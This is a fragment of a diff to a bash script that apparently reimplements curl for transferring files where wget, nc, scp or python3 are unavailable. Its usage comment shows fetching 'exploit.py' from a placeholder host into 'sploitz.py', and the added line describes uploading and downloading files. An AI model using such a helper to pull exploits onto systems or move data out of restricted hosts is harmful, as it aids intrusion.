@@ -1,4 +1,5 @@
 # USAGE: curl.sh http://www.example.com/exploit.py > sploitz.py
+# Allow downloading and uploading file if wget , nc , scp , python3 not working
 
 #!/bin/bash
 function __curl() {
